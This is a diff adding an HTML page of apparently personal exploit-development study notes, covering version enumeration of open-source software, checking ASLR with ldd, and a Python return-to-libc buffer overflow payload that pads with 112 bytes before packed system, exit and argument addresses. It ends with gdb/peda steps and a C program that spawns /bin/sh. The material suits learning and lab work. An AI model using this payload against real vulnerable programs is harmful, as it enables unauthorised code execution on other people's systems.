@@ -1,0 +1,37 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>October</title>
+</head><body>Web:<br/>
+Can do enumeration on open source software to help identify readme or license files that have changed, and you can better identify target software versions to see if they are vulnerable<br/>
+<br/>
+Exploit dev...mimic the target system as close as possible, ie same release, same arch, etc<br/>
+<br/>
+ldd to check for ASLR<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+python code for RET2LIBC:<br/>
+import struct<br/>
+<br/>
+system_addr = struct.pack("&lt;I",0x80482f0) &#09;#address of system in libc<br/>
+exit_addr = struct.pack("&lt;I",0xd3adc0d3)<br/>
+arg_addr = struct.pack("&lt;I",0xb7f7584c)<br/>
+<br/>
+buf = "A" * 112<br/>
+#buf += struct.pack("&lt;I",0xd3adc0d3) &#09;&#09;# the "&lt; I" is for little endian (it's an i) (d3adc0d3 is leet for deadcode)<br/>
+# this is only for ensuring we are overwriting correct EIP<br/>
+buf += system_addr<br/>
+buf += exit_addr<br/>
+buf += arg_addr<br/>
+<br/>
+<br/>
+<br/>
+Need the memory address of system. 'p system' using peda in gdb while debugging the following C code:<br/>
+&nbsp;&#09;#include &lt;stdlib.h&gt;<br/>
+&nbsp;&#09;<br/>
+&nbsp;&#09;void main() {<br/>
+&nbsp;&#09;&#09;system("/bin/sh");<br/>
+&nbsp;&#09;}</body></html>
